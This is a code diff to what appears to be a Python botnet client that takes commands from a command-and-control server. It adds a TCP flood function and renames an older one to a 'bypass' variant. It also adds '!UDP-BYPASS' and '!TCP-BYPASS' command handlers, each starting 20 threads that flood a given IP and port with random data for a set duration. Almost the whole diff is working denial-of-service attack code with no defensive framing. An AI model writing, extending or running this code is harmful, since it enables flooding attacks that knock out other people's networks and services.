@@ -29,7 +29,17 @@ def attack_udp(ip, port, end_time, size):
         finally:
             s.close()
 
-
+def attack_tcp(ip, port, end_time, size):
+    while time.time() < end_time:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((ip, port))
+            while time.time() < end_time:
+                s.send(random._urandom(size))
+        except:
+            pass
+        finally:
+            s.close()
 
 
 #layer 4 normal attacks
@@ -60,7 +70,7 @@ def attack_udp_bypass(ip, port, end_time, size):
 
 
 
-def attack_tcp(ip, port, end_time, size):
+def attack_tcp_bypass(ip, port, end_time, size):
     max_packets = 1950
 
     while time.time() < end_time:
@@ -145,6 +155,26 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!UDP-BYPASS':
+                    ip = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = int(args[4])
+                    threads = 20
+
+                    for _ in range(threads):
+                        threading.Thread(target=attack_udp_bypass, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!TCP-BYPASS':
+                    ip = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = int(args[4])
+                    threads = 20
+
+                    for _ in range(threads):
+                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
